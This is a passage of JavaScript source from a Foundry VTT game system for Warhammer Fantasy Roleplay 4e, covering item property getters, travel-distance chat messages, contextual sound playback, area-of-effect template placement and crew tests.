  // if the item was "Actor" document type, it would be transferred to the actor and 
  // the actor's getScripts would run it instead
  // 
  // This is important as roll dialogs call actor.getScripts() and then item.getScripts()
  // so that when an item is used, it can specifically add its dialog scripts
  // (prevents the need to check in the script code whether or not the item is being used)
  getScripts(trigger)
  {
      let effects = Array.from(this.allApplicableEffects()).
          filter(effect => 
              effect.applicationData.type == "document" && 
              effect.applicationData.documentType == "Item");

      let fromActor = this.actor?.getScriptsApplyingToItem(this) || [];

      return effects.reduce((prev, current) => prev.concat(current.scripts), []).concat(fromActor).filter(i => i.trigger == trigger);
  }

  _getTypedEffects(type)
  {
      let effects = Array.from(this.allApplicableEffects()).filter(effect => effect.applicationData.type == type);

      return effects;
  }

   *allApplicableEffects() 
   {
     for(let effect of this.effects.contents.concat(this.system.getOtherEffects()))//.filter(e => this.system.effectIsApplicable(e));
     {
      if (!effect.disabled)
        yield effect;
     }
   }
 
   get damageEffects() 
   {
       return this._getTypedEffects("damage");
   }
 
   get targetEffects() 
   {
       return this._getTypedEffects("target").concat(this._getTypedEffects("aura").filter(e => e.applicationData.targetedAura));
   }
 
   get areaEffects() 
   {
       return this._getTypedEffects("area");
   }

   get manualScripts() 
   {
      return this.effects.reduce((scripts, effect) => scripts.concat(effect.manualScripts), [])
   }
   
  get mountDamage() {
    return this.system.mountDamage || this.system.Damage;
  }

  // Don't really like this, but I don't think I can change it easily (used by scripts)
  get characteristic() {
    if (!this.isOwned)
      return this.system.characteristic
    let char;
    if (this.type == "skill") {
      char = this.actor.characteristics[this.system.characteristic.value];
      char.key = this.system.characteristic.value;
    }
    if (this.type == "trait" && this.rollable.value) {
      char = this.actor.characteristics[this.system.rollable.rollCharacteristic];
      char.key = this.system.rollable.rollCharacteristic;
    }
    return char
  }

    // Used for item category display when in a container
  get trappingCategory() {
      if (this.type == "trapping")
        return game.wfrp4e.config.trappingCategories[this.trappingType.value];
      else
        return game.wfrp4e.config.trappingCategories[this.type];
  }

  get parenthesesText()
  {
    return game.wfrp4e.utility.extractParenthesesText(this.name)
  }

  get fromEffect() 
  {
    if (this.isOwned)
    {
      let applicableEffects = Array.from(this.actor.allApplicableEffects());
      
      return applicableEffects.find(i => i.id == this.getFlag("wfrp4e", "fromEffect"));
    }
  }

  // While I wish i could remove most of these, scripts use them and removing them would cause a lot of disruption
  // They made more sense in the `data.data` days
  get attackType()         { return this.system.attackType }
  get isMelee()            { return this.system.isMelee }
  get isRanged()           { return this.system.isRanged }
  get isEquipped()         { return this.system.isEquipped }
  get WeaponGroup()        { return this.system.WeaponGroup }
  get Reach()              { return this.system.Reach }
  get Max()                { return this.system.Max }
  get DisplayName()        { return this.system.DisplayName }
  get cost()               { return this.system.cost }
  get included()           { return !this.system.disabled } // not checking enabled because only traits have enabled getter
  get reachNum()           { return this.system.reachNum }   
  get ammo()               { return this.system.ammo }   
  get ammoList()           { return this.system.ammoList }   
  get ingredient()         { return this.system.ingredient }   
  get ingredientList()     { return this.system.ingredientList }   
  get skillToUse()         { return this.system.skillToUse }   
  get loading()            { return this.system.loading }   
  get repeater()           { return this.system.repeater }   
  get reloadingTest()      { return this.actor.items.get(getProperty(this.data, "flags.wfrp4e.reloading")) }   
  get protects()           { return this.system.protects }   
  get properties()         { return this.system.properties }   
  get originalProperties() { return this.system.originalProperties }   
  get modified()           { return this.system.modified }   
  get Advances()           { return this.system.Advances }   
  get Qualities()          { return this.system.Qualities }   
  get UnusedQualities()    { return this.system.UnusedQualities }   
  get InactiveQualities()  { return this.system.InactiveQualities }   
  get Flaws()              { return this.system.Flaws }   
  get OriginalQualities()  { return this.system.OriginalQualities; }   
  get OriginalFlaws()      { return this.system.OriginalFlaws; }   
  get QualityGroups()      { return this.system.QualityGroups; }   
  get Target()             { return this.system.Target }   
  get Duration()           { return this.system.Duration }   
  get Range()              { return this.system.Range }   
  get Damage()             { return this.system.Damage }   
  get DamageString()       { return this.system.DamageString }  
  get Specification()      { return this.system.Specification }
  get SpecificationBonus() { return this.system.SpecificationBonus }
  get advanced()           { return this.system.advanced }
  get advances()           { return this.system.advances }
  get ammunitionGroup()    { return this.system.ammunitionGroup }
  get ammunitionType()     { return this.system.ammunitionType }
  get armorType()          { return this.system.armorType }
  get availability()       { return this.system.availability }
  get career()             { return this.system.career }
  get careergroup()        { return this.system.careergroup }
  get cargoType()          { return this.system.cargoType }
  get carries()            { return this.system.carries }
  get characteristics()    { return this.system.characteristics }
  get class()              { return this.system.class }
  get cn()                 { return this.system.cn }
  get coinValue()          { return this.system.coinValue }
  get complete()           { return this.system.complete }
  get completion()         { return this.system.completion }
  get consumesAmmo()       { return this.system.consumesAmmo }
  get contraction()        { return this.system.contraction }
  get countEnc()           { return this.system.countEnc }
  get current()            { return this.system.current }
  get currentAmmo()        { return this.system.currentAmmo }
  get currentAP()          { return this.system.currentAP }
  get currentIng()         { return this.system.currentIng }
  get damage()             { return this.system.damage }
  get damageToItem()       { return this.system.damageToItem }
  get description()        { return this.system.description }
  get duration()           { return this.system.duration }
  get encumbrance()        { return this.system.encumbrance }
  get equipped()           { return this.system.equipped }
  get failingDecreases()   { return this.system.failingDecreases }
  get flaws()              { return this.system.flaws }
  get gmdescription()      { return this.system.gmdescription }
  get god()                { return this.system.god }
  get grouped()            { return this.system.grouped }
  get hide()               { return this.system.hide }
  get incomeSkill()        { return this.system.incomeSkill }
  get incubation()         { return this.system.incubation }
  get ingredients()        { return this.system.ingredients }
  get level()              { return this.system.level }
  get loaded()             { return this.system.loaded }
  get location()           { return this.system.location }
  get lore()               { return this.system.lore }
  get magicMissile()       { return this.system.magicMissile }
  get max()                { return this.system.max }
  get AP()                 { return this.system.AP }
  get APdamage()           { return this.system.APdamage }
  get memorized()          { return this.system.memorized }
  get modeOverride()       { return this.system.modeOverride }
  get modifier()           { return this.system.modifier }
  get modifiesSkills()     { return this.system.modifiesSkills }
  get modType()            { return this.system.modType }
  get mutationType()       { return this.system.mutationType }
  get negativePossible()   { return this.system.negativePossible }
  get offhand()            { return this.system.offhand }
  get origin()             { return this.system.origin }
  get overcast()           { return this.system.overcast }
  get penalty()            { return this.system.penalty }
  get permanent()          { return this.system.permanent }
  get price()              { return this.system.price }
  get qualities()          { return this.system.qualities }
  get quality()            { return this.system.quality }
  get quantity()           { return this.system.quantity }
  get range()              { return this.system.range }
  get reach()              { return this.system.reach }
  get rollable()           { return this.system.rollable }
  get skill()              { return this.system.skill }
  get skills()             { return this.system.skills }
  get SL()                 { return this.system.SL }
  get special()            { return this.system.special }
  get specification()      { return this.system.specification }
  get spellIngredient()    { return this.system.spellIngredient }
  get status()             { return this.system.status }
  get symptoms()           { return this.system.symptoms }
  get talents()            { return this.system.talents }
  get target()             { return this.system.target }
  get test()               { return this.system.test }
  get tests()              { return this.system.tests }
  get total()              { return this.system.total }
  get trappings()          { return this.system.trappings }
  get trappingType()       { return this.system.trappingType }
  get twohanded()          { return this.system.twohanded }
  get prayerType()         { return this.system.type }
  get unitPrice()          { return this.system.unitPrice }
  get weaponGroup()        { return this.system.weaponGroup || "basic" }
  get wearable()           { return this.system.wearable }
  get wind()               { return this.system.wind }
  get worn()               { return this.system.worn }
  get wounds()             { return this.system.wounds }
  //#endregion
}

/**
 * WIP
 * This class contains functions and helpers related to the market and Pay system
 */
class TravelDistanceWfrp4e {


    /**
    * This method load the travel data from the internal JSON file
    */
    static async loadTravelData() {
        FilePicker.browse("data", `systems/wfrp4e/data/`).then(resp => {

        for (var file of resp.files) {
          try {
            if (!file.includes(".json"))
              continue
            let filename = file.substring(file.lastIndexOf("/") + 1, file.indexOf(".json"));

            fetch(file).then(r => r.json()).then(async records => {
                this.travel_data = records;
            });
          }
          catch (error) {
            console.error("Error reading " + file + ": " + error);
          }
        }
    });
  }

  /**
   * Returns a human-readable danger level for the road
  */
  static dangerToString( dangerLevel )
  {
    if ( dangerLevel == "") return game.i18n.localize("TRAVEL.DangerVeryLow");
    if ( dangerLevel == '!') return game.i18n.localize("TRAVEL.DangerLow");
    if ( dangerLevel == '!!') return game.i18n.localize("TRAVEL.DangerMedium");
    if ( dangerLevel == '!!!') return game.i18n.localize("TRAVEL.DangerHigh");
    return game.i18n.localize("TRAVEL.DangerVeryHigh");
  }

  /**
   * Returns either a decimal value or x.5 value
   * @param {Number} duration 
   * @returns new duration
   */
  static roundDuration( duration ) 
  {
    let trunc = Math.trunc(duration);
    let frac = duration - trunc;
    let adjust = 0;
    if ( frac > 0.75) adjust = 1;
    else if ( frac >= 0.25) adjust = 0.5;
    return trunc + adjust;
  }

    /**
    * This method either display the distances between 2 towns (ie when toTown is set) or display a list of destinations
    * @param {string} fromTown
    * @param {string} toTown
    * @returns 
    */
   static displayTravelDistance( fromTown, toTown ) {
    
    let message = "";

    //("TRAVEL ...", fromTown, toTown );
    if ( toTown ) {
      fromTown = fromTown.toLowerCase();
      toTown = toTown.toLowerCase();
      for ( var travel of this.travel_data) {
        if ( travel.from.toLowerCase() == fromTown && travel.to.toLowerCase() == toTown ) {
          message += `<p>${game.i18n.format("TRAVEL.TravelMessageBase", travel)}`;
          if ( travel.road_distance != "" ) {
            travel.road_horse_heavy_days = this.roundDuration( travel.road_days * 0.8);
            travel.road_horse_fast_days  = this.roundDuration( travel.road_days * 0.65);
            travel.road_feet_days  = this.roundDuration( travel.road_days * 1.25 );
            travel.road_danger_string = this.dangerToString( travel.road_danger );
            travel.road_danger_feet_string = this.dangerToString( travel.road_danger + "!" ); // Increase danger level by feet
            message += `${game.i18n.format("TRAVEL.TravelMessageRoad", travel)}`;                    
          }
          if ( travel.river_distance != "" ) {
            travel.river_danger_string = this.dangerToString( travel.river_danger );
            message += `${game.i18n.format("TRAVEL.TravelMessageRiver", travel)}`;                    
          }
          if ( travel.sea_distance != "" ) {
            travel.sea_danger_string = this.dangerToString( travel.sea_danger );
            message += `${game.i18n.format("TRAVEL.TravelMessageSea", travel)}`;                    
          }
          message += "</p>";
        }
      }
    
    } else if ( fromTown && fromTown == "help") {
      message += `<p>${game.i18n.localize("TRAVEL.Helper")}</p>`;

    } else if ( fromTown) {
      fromTown = fromTown.toLowerCase();
      message += `<h3>${game.i18n.localize("TRAVEL.TownPrompt")}</h3>`;
      for ( var travel of this.travel_data) {
        if ( travel.from.toLowerCase() == fromTown ) {
          message += `<div><a class = "travel-click" data-fromtown="${travel.from}" data-totown = "${travel.to}"><i class="fas fa-list"></i> ${travel.to}</a></div>`;
        }
      }
    } else {
      message += `<h3>${game.i18n.localize("TRAVEL.TownOriginPrompt")}</h3>`;
      let uniqTown = {};
      for ( var travel of this.travel_data) {
        if ( uniqTown[travel.from] == undefined ) {
          uniqTown[travel.from] = 1; // Already added in the list
          message += `<div><a class = "travel-click" data-fromtown="${travel.from}"><i class="fas fa-list"></i> ${travel.from}</a></div>`;
        }
      }
    }
    ChatMessage.create( WFRP_Utility.chatDataSetup( message ) );      
   }

   /**
    * 
    */
   static handleTravelClick( event ) {
    let fromTown = $(event.currentTarget).attr("data-fromtown");
    let toTown = $(event.currentTarget).attr("data-totown");
    TravelDistanceWfrp4e.displayTravelDistance( fromTown, toTown);
   }

}

class WFRP_Audio {
  static PlayContextAudio(context) {
    this.MatchContextAudio(context).then(sound => {
      if (!sound || !sound.file) {
        console.warn("wfrp4e | Sound file not found for context: %o", context);
        return
      }
      game.wfrp4e.utility.log(`wfrp4e | Playing Sound: ${sound.file}`);
      AudioHelper.play({ src: sound.file }, sound.global);
    });
    
  }

  static FindContext(test) {
    let context = undefined;

    if (test.skill) {
      if (test.skill.name == game.i18n.localize("NAME.ConsumeAlcohol")) {
        context = { item: test.skill, action: "consumeAlcohol" };
        context.outcome = (test.result.roll <= 5 || test.result.roll <= test.result.target) ? "success" : "fail";
      }
      if (test.skill.name == game.i18n.localize("NAME.PickLock")) {
        context = { item: test.skill, action: "pickLock" };
      }
      else if (test.skill.name == game.i18n.localize("NAME.Stealth")) {
        context = { item: test.skill, action: "stealth" };
        context.outcome = (test.result.roll <= 5 || test.result.roll <= test.result.target) ? "success" : "fail";
      }
    }
    if (test.weapon) {
      context = { item: test.weapon, action: "fire" };
      if (test.result.misfire)
        context.action = "misfire";

      if (test.weapon.isRanged && test.failed &&
        (test.weapon.weaponGroup.value === "bow"
          || test.weapon.weaponGroup.value === "crossbow"
          || test.weapon.weaponGroup.value === "blackpowder"
          || test.weapon.weaponGroup.value === "engineering")) {
        let delayedContext = foundry.utils.deepClone(context);
        delayedContext.action = "miss";
        setTimeout((delayedContext) => { this.PlayContextAudio(delayedContext); }, 1000, delayedContext);
      }

      if (test.weapon.weaponGroup == "explosives" || test.weapon.weaponGroup == "throwing")
        context.action = "throw";
    }
    if (test.result.critical && test.weapon && test.weapon.properties.qualities.impale) {
      context = { item: {}, action: "hit", outcome: "crit_impale" };
    }
    if (test.spell) {
        if (test.result.castOutcome == "success"){
        context = { item: test.spell, action: "cast" };
        if (test.spell.damage)
          context.outcome = "damage";
      }

      if (test.result.minormis || test.result.majormis)
        context = { item: test.spell, action: "miscast" };
    }
    if (test.prayer) {
      if (test.result.outcome == "success")
        context = { item: test.prayer, action: "cast" };

      if (test.result.wrath)
        context = { item: test.prayer, action: "miscast" };
    }

    return context
  }



  /** CONTEXTUAL MODEL
   *  context = {
   *      action : equip, cast, lose, gain, etc.
   *      item : item associated with the action
   *      outcome : typcially success or failure, or other specifier, sometimes unused
   *  }
   */

  static async MatchContextAudio(context) {
    if (!game.settings.get("wfrp4e", "soundPath") || !context)
      return {}

    try {
      let files, file, group;
      await FilePicker.browse("user", game.settings.get("wfrp4e", "soundPath")).then(resp => {
        files = resp.files;
      });
      if (context.action == "hit")
        file = "hit";
      let globalSound = false;
      {
        switch (context.item.type) {
          case "weapon":
            group = context.item.weaponGroup.value;
            if (group == "crossbow")
              file = context.action == "equip" ? "weapon_bow" : "weapon_xbow";
            else if (group == "bow")
              file = "weapon_bow";
            else if (group == "fencing" || group == "parry" || group == "twohanded")
              file = context.action == "fire" ? "weapon-" : "weapon_sword";
            else if (group == "flail" && context.action == "fire") {
              file = "weapon_flail-";
              if (context.item.properties.qualities.impact)
                file = "weapon_flail_impact";
            }
            else if (group == "blackpowder" || group == "engineering")
              file = "weapon_gun";
            else if (group == "explosives")
              file = "weapon_bomb";
            else if (group == "throwintg") {
              file = "weapon-";
              if (context.action != "equip") {
                file = "weapon_throw";
                if (context.item.properties.qualities.hack)
                  file = "weapon_axe_throw";
              }
            }
            else if (group == "entangling" && context.action != "swing")
              file = "weapon_entangling";
            else
              file = "weapon-";
            break;
          case "armour":
            if (context.action.includes("equip")) {
              group = context.item.armorType.value;
              file = group.includes("Leather") ? "leather" : group;
            }
            else if (context.action == "hit") {
              group = context.item.type;
              file = context.outcome || "";
            }
            break;
          case "trapping":
            file = context.item.trappingType.value.includes("clothing") ? "cloth" : "item";
            break;
          case "spell":
            file = "spell";
            break;
          case "prayer":
            file = "prayer";
            break;
          case "round":
            file = "round";
            globalSound = true;
            break;
          case "skill":
            file = "skill";
            break;
          case "money":
            file = "money";
            break;
          case "shield":
            file = "weapon_shield";
            break;
          case "throw":
            file = "hit_throw-";
            break;
          case "throw_axe":
            file = "hit_throw_axe";
            break;
        }
      }
      if (context.item.special == "warhammer")
        file = "warhammer";
      files = files.filter(f => f.includes(file));

      if (context.item.type == "weapon") {
        globalSound = true;

        if (context.action == "miss")
          files = files.filter(f => f.includes("-miss"));
        else if (context.action == "misfire")
          files = files.filter(f => f.includes("-misfire"));
        else if (context.action == "fire") {
          if (file == "weapon_xbow" || file == "weapon_bow" || file == "weapon_gun" || file.includes("throw"))
            files = files.filter(f => f.includes("-fire"));
          else if (file != "weapon_bomb")
            files = files.filter(f => f.includes("-swing"));
          else
            files = files.filter(f => f.includes("-throw"));
        }
        else if (context.action == "load")
          files = files.filter(f => f.includes("-load"));
        else if (context.action == "damage") {
          globalSound = false;
          files = files.filter(f => f.includes("damage"));
          if (context.outcome == "shield")
            files = files.filter(f => f.includes("shield"));
        }

      }
      if (context.item.type == "shield") {
        files = files.filter(f => f.includes(context.action));
      }
      if (context.action == "equip") {
        if (context.outcome || context.item.type == "weapon") {
          files = files.filter(f => f.includes("-equip"));
        }
        else {
          files = files.filter(f => f.includes("deequip"));
        }
      }
      if (context.action == "hit") {
        files = files.filter(f => f.includes("hit"));
      }

      if (context.item.type == "spell") {
        if (context.action == "memorize")
          files = files.filter(f => f.includes("-memorize"));
        else if (context.action == "unmemorize")
          files = files.filter(f => f.includes("unmemorize"));
        else if (context.action == "cast") {
          if (context.outcome == "damage")
            files = files.filter(f => f.includes("damage-cast"));
          else
            files = files.filter(f => f.includes("-cast") && !f.includes("damage"));
          globalSound = true;
        }
        else {
          files = files.filter(f => f.includes("miscast"));
          globalSound = true;
        }
      }

      if (context.item.type == "prayer") {
        globalSound = true;
        if (context.action == "cast")
          files = files.filter(f => f.includes("-cast"));
        else
          files = files.filter(f => f.includes("miscast"));
      }

      if (context.action == "hit") {
        globalSound = true;
        if (context.outcome == "blocked")
          files = files.filter(f => f.includes(context.item.armourType));
        else if (context.item.type == "armour")
          files = files.filter(f => f.includes("armour"));
        else
          files = files.filter(f => !f.includes("armour")); // all non-armour sounds

        if (context.outcome == "normal")
          files = files.filter(f => f.includes("normal"));

        if (context.outcome == "warhammer")
          files = files.filter(f => f.includes("warhammer"));


        if (context.outcome == "crit")
          files = files.filter(f => f.includes("crit-"));
        if (context.outcome == "crit_impale")
          files = files.filter(f => f.includes("crit_impale"));
      }

      if (context.item.type == "skill") {
        if (context.action == "consumeAlcohol")
          files = files.filter(f => f.includes(`consumeAlcohol-${context.outcome == "fail" ? 'fail' : 'success'}`));
        if (context.action == "stealth")
          files = files.filter(f => f.includes(`stealth-${context.outcome == "fail" ? 'fail' : 'success'}`));
        if (context.action == "pickLock")
          files = files.filter(f => f.includes(context.action));
      }

      return { file: files[(await new Roll(`1d${files.length}-1`).roll()).total], global: globalSound }
    }
    catch (e) {
      WFRP_Utility.log("Sound Context Error: " + e, true);
    }
  }
}

/**
 * Shamelessly copied from dnd5e's spell template implementation
 * @extends {MeasuredTemplate}
 */
class AbilityTemplate extends MeasuredTemplate {

  /**
   * Track the timestamp when the last mouse move event was captured.
   * @type {number}
   */
  #moveTime = 0;

  /* -------------------------------------------- */

  /**
   * The initially active CanvasLayer to re-activate after the workflow is complete.
   * @type {CanvasLayer}
   */
  #initialLayer;

  /* -------------------------------------------- */

  /**
   * Track the bound event handlers so they can be properly canceled later.
   * @type {object}
   */
  #events;

    /**
     * A factory method to create an AOETemplate instance using provided string
     * @param {String} aoestring          string describing the area of effect (AoE(5 yards) or just 5 yards)
     * @return {AbilityTemplate|null}     The template object, or null if the item does not produce a template
     */
    static fromString(aoeString, actorId, itemId, messageId, diameter=true) 
    {
      if (aoeString.toLowerCase().includes(game.i18n.localize("AoE").toLowerCase()))
        aoeString = aoeString.substring(aoeString.indexOf("(")+1, aoeString.length-1);
      
      // Prepare template data
      const templateData = {
        t: "circle",
        user: game.user.id,
        distance: diameter ? parseInt(aoeString) / 2 : parseInt(aoeString),
        direction: 0,
        x: 0,
        y: 0,
        fillColor: game.user.color,
        flags: {
          wfrp4e: {
            itemuuid: `Actor.${actorId}.Item.${itemId}`,
            messageId: messageId,
            round: game.combat?.round ?? -1,
            target : true
          }
        }
      };
  
      const cls = CONFIG.MeasuredTemplate.documentClass;
      const template = new cls(templateData, {parent: canvas.scene});
  
      // Return the template constructed from the item data
      return new this(template);
    }

  static async fromEffect(effectUuid, messageId, radius) {

    let effect = await fromUuid(effectUuid);
    // Sometimes, the radius needs to reference the test (usually overcasting)
    foundry.utils.setProperty(effect, "flags.wfrp4e.sourceTest",  game.messages.get(messageId)?.getTest());
    radius = radius || effect.radius; 

    // Prepare template data
    const templateData = {
      t: "circle",
      user: game.user.id,
      distance: radius,
      direction: 0,
      x: 0,
      y: 0,
      fillColor: game.user.color,
      flags: {
        wfrp4e: {
          effectUuid: effectUuid,
          messageId: messageId,
          round: game.combat?.round ?? -1,
          instantaneous : effect.applicationData.areaType == "instantaneous"
        }
      }
    };

    const cls = CONFIG.MeasuredTemplate.documentClass;
    const template = new cls(templateData, {target: true, parent: canvas.scene });

    // Return the template constructed from the item data
    return new this(template);
  }
  /* -------------------------------------------- */

  /**
   * Creates a preview of the spell template.
   * @returns {Promise}  A promise that resolves with the final measured template if created.
   */
  drawPreview() {
    const initialLayer = canvas.activeLayer;

    // Draw the template and switch to the template layer
    this.draw();
    this.layer.activate();
    this.layer.preview.addChild(this);

    // Hide the sheet that originated the preview
    this.actorSheet?.minimize();

    // Activate interactivity
    return this.activatePreviewListeners(initialLayer);
  }

  /* -------------------------------------------- */

  /**
   * Activate listeners for the template preview
   * @param {CanvasLayer} initialLayer  The initially active CanvasLayer to re-activate after the workflow is complete
   * @returns {Promise}                 A promise that resolves with the final measured template if created.
   */
  activatePreviewListeners(initialLayer) {
    return new Promise((resolve, reject) => {
      this.#initialLayer = initialLayer;
      this.#events = {
        cancel: this._onCancelPlacement.bind(this),
        confirm: this._onConfirmPlacement.bind(this),
        move: this._onMovePlacement.bind(this),
        resolve,
        reject,
        rotate: this._onRotatePlacement.bind(this)
      };

      // Activate listeners
      canvas.stage.on("mousemove", this.#events.move);
      canvas.stage.on("mousedown", this.#events.confirm);
      canvas.app.view.oncontextmenu = this.#events.cancel;
      canvas.app.view.onwheel = this.#events.rotate;
    });
  }

  /* -------------------------------------------- */

  /**
   * Shared code for when template placement ends by being confirmed or canceled.
   * @param {Event} event  Triggering event that ended the placement.
   */
  async _finishPlacement(event) {
    this.layer._onDragLeftCancel(event);
    canvas.stage.off("mousemove", this.#events.move);
    canvas.stage.off("mousedown", this.#events.confirm);
    canvas.app.view.oncontextmenu = null;
    canvas.app.view.onwheel = null;
    this.#initialLayer.activate();
    await this.actorSheet?.maximize();
  }

  /* -------------------------------------------- */

  /**
   * Move the template preview when the mouse moves.
   * @param {Event} event  Triggering mouse event.
   */
  _onMovePlacement(event) {
    event.stopPropagation();
    let now = Date.now(); // Apply a 20ms throttle
    if ( now - this.#moveTime <= 20 ) return;
    const center = event.data.getLocalPosition(this.layer);
    const snapped = canvas.grid.getSnappedPosition(center.x, center.y, 2);
    this.document.updateSource({x: snapped.x, y: snapped.y});
    this.refresh();
    this.#moveTime = now;
    if (this.document.getFlag("wfrp4e", "target"))
    {
      this.updateAOETargets();
    }
  }

  /* -------------------------------------------- */

  /**
   * Rotate the template preview by 3˚ increments when the mouse wheel is rotated.
   * @param {Event} event  Triggering mouse event.
   */
  _onRotatePlacement(event) {
    if ( event.ctrlKey ) event.preventDefault(); // Avoid zooming the browser window
    event.stopPropagation();
    let delta = canvas.grid.type > CONST.GRID_TYPES.SQUARE ? 30 : 15;
    let snap = event.shiftKey ? delta : 5;
    const update = {direction: this.document.direction + (snap * Math.sign(event.deltaY))};
    this.document.updateSource(update);
    this.refresh();
  }

  /* -------------------------------------------- */

  /**
   * Confirm placement when the left mouse button is clicked.
   * @param {Event} event  Triggering mouse event.
   */
  async _onConfirmPlacement(event) {
    await this._finishPlacement(event);
    const destination = canvas.grid.getSnappedPosition(this.document.x, this.document.y, 2);
    this.document.updateSource(destination);
    this.#events.resolve(canvas.scene.createEmbeddedDocuments("MeasuredTemplate", [this.document.toObject()]).then(templates => {
      let test = game.messages.get(templates[0].flags.wfrp4e.messageId)?.getTest();
      if (test && test.data.context.templates)
      {
        test.data.context.templates = test.data.context.templates.concat(templates[0].id);
        test.renderRollCard();
      }
    }));
  }

  /* -------------------------------------------- */

  /**
   * Cancel placement when the right mouse button is clicked.
   * @param {Event} event  Triggering mouse event.
   */
  async _onCancelPlacement(event) {
    await this._finishPlacement(event);
    this.#events.reject();
  }

  updateAOETargets()
  {
    let grid = canvas.scene.grid;
    let templateGridSize = this.document.distance/grid.distance * grid.size;

    let minx = this.document.x - templateGridSize;
    let miny = this.document.y - templateGridSize;

    let maxx = this.document.x + templateGridSize;
    let maxy = this.document.y + templateGridSize;

    let newTokenTargets = [];
    canvas.tokens.placeables.forEach(t => {
      if ((t.x + (t.width / 2)) < maxx && (t.x + (t.width / 2)) > minx && (t.y + (t.height / 2)) < maxy && (t.y + (t.height / 2)) > miny)
        newTokenTargets.push(t.id);
    });
    game.user.updateTokenTargets(newTokenTargets);
    game.user.broadcastActivity({targets: newTokenTargets});
  }

}

class CrewTest 
{
    constructor(item) {
        this.item = item;
        this.messageId = foundry.utils.randomID();
        this.roles = this.initializeRoles();

    }

    static fromData(data)
    {
        let test = new this(fromUuidSync(data.uuid));
        test.messageId = data.messageId;
        test.roles = data.roles;
        return test;
    }

    toData()
    {
        return {
            uuid : this.item.uuid,
            messageId : this.messageId,
            roles : this.roles
        }
    }

    initializeRoles()
    {
        let roles = {};
        let actor = this.item.actor;

        for(let role of this.item.system.roles.value.split(",").map(i => i.trim()))
        {
            let roleItem = actor.itemTypes.vehicleRole.find(i => i.name == role);

            if (roleItem)
            {
                roles[roleItem.id] = {
                    name : role,
                    messageId : null
                };
            }
            else 
            {
                // Won't be found
                roles[foundry.utils.randomID()] = {
                    name : role,
                    unknown : true
                };
            }
        }
        return roles;
    }


    updateRole(roleId, message)
    {
        if (this.roles[roleId])
        {
            this.roles[roleId].messageId = message.id;
        }
        this.renderChatPrompt();
    }

    get totalSL()
    {
        if (Object.values(this.roles).some(i => !i.messageId))
        {
            return "???"
        }

        let tests = Object.values(this.roles).map(i => game.messages.get(i.messageId)?.getTest()).filter(i => i);

        let SL = tests.reduce((SL, test) => SL + test.result.crewTestSL, 0);

        return SL;
    }
    

    renderChatPrompt()
    {
        let actor = this.item.actor;
        if (!actor)
        {
            throw Error("Must be owned by an Actor to prompt a Crew Test")
        }

                
        let crew = actor.system.crew;
        let html = "";
        for(let id in this.roles)
        {
            let roleHTML = "";
            let roleData = this.roles[id];
            let role = roleData.name;
            let roleItem = actor.items.get(id);
            let crewWithRole = crew.filter(c => c.roles.find(i => i.name == role));
            if (roleItem)
            {

                let isVital = roleItem.system.isVitalFor(this.item);
                roleHTML += `<strong>${role}</strong>`;
                if (isVital)
                {                    roleHTML = `<em>${roleHTML}</em>`;
                }
                
                if (crewWithRole.length > 0)
                {
                    roleHTML = `<p>${roleHTML}: ${crewWithRole.map(c => c.actor.name).join(", ")}</p>`;
                }
                else 
                {
                    roleHTML = `<p>${roleHTML}: ${game.i18n.localize("CHAT.NoCrewWithRole")}</p>`;
                }
                roleHTML += `<a class="chat-button crew-test" data-vital="${isVital}" data-uuid="${roleItem.uuid}">${roleItem.system.test} ${roleData.messageId ? '<i class="fa-solid fa-check"></i>' : ""}</a>`;
            }
            else 
            {
                roleHTML += `${game.i18n.format("CHAT.RoleNotFound", {role})}`;
            }
            html += roleHTML + "<hr>";
        }

        html += `<h3 style='border: none'>${game.i18n.localize("CHAT.TotalSL")}: <span class='sl-total'>${this.totalSL}</span></h3>`;


        let chatData = {
            _id : this.messageId,
            content : `
                <h3>${this.item.name}</h3>
                ${html}
            `,
            speaker : {
                alias : actor?.name,
            },
            flavor : game.i18n.localize("CHAT.CrewTest"),
            flags : {
                wfrp4e : {
                    crewTestData : this.toData()
                }
            }
        };


        if (this.message)
        {
            this.message.update(chatData);
        }
        else 
        {
            ChatMessage.create(chatData, {keepId: true});
        }
    }

    get message()
    {
        return game.messages.get(this.messageId);
    }
}

class TestWFRP {
  constructor(data, actor) {
    if (!data)
      data = {};
    this.data = {
      preData: {
        title: data.title,
        SL: data.SL,
        roll: data.roll,
        target: data.target,
        rollClass: this.constructor.name,
        testModifier: data.modifier || 0,
        testDifficulty: (typeof data.difficulty == "string" ? game.wfrp4e.config.difficultyModifiers[data.difficulty] : data.difficulty) || 0,
        successBonus: data.successBonus || 0,
        slBonus: data.slBonus || 0,
        hitLocation: data.hitLocation != "none" && data.hitLocation || false,
        characteristic : data.characteristic,
        item: data.item,
        diceDamage: data.diceDamage,
        options: data.options || {},
        other: data.other || [],
        canReverse: data.canReverse || false,
        postOpposedModifiers: data.postOpposedModifiers || { modifiers: 0, SL: 0 },
        additionalDamage: data.additionalDamage || 0,
        selectedHitLocation : typeof data.hitLocation == "string" ? data.hitLocation : "", // hitLocation could be boolean
        hitLocationTable : data.hitLocationTable,
      },
      result: {
        roll: data.roll,
        description: "",
        tooltips: {}
      },
      context: {
        rollMode: data.rollMode,
        reroll: false,
        edited: false,
        speaker: data.speaker,
        targets: data.targets,
        chatOptions: data.chatOptions,
        unopposed : data.unopposed,
        defending : data.defending,
        breakdown : foundry.utils.mergeObject({damage : {other : []}}, data.breakdown),

        messageId: data.messageId,
        opposedMessageIds : data.opposedMessageIds || [],
        fortuneUsedReroll: data.fortuneUsedReroll,
        fortuneUsedAddSL: data.fortuneUsedAddSL,
      }
    };

    if (this.context.speaker && this.actor.isOpposing && this.context.targets.length)
    {
      ui.notifications.notify(game.i18n.localize("TargetingCancelled"));
      this.context.targets = [];
    }

    if (!this.context.speaker && actor)
      this.context.speaker = actor.speakerData();
  }

  computeTargetNumber() {
    if (this.preData.target)
      this.data.result.target = this.preData.target;
    else
      this.data.result.target += this.targetModifiers;
  }

  async runPreEffects() {
    if (!this.context.unopposed)
    {
      await Promise.all(this.actor.runScripts("preRollTest", { test: this, chatOptions: this.context.chatOptions }));
      if (this.item instanceof Item)
      {
        await Promise.all(this.item.runScripts("preRollTest", { test: this, chatOptions: this.context.chatOptions }));
      }

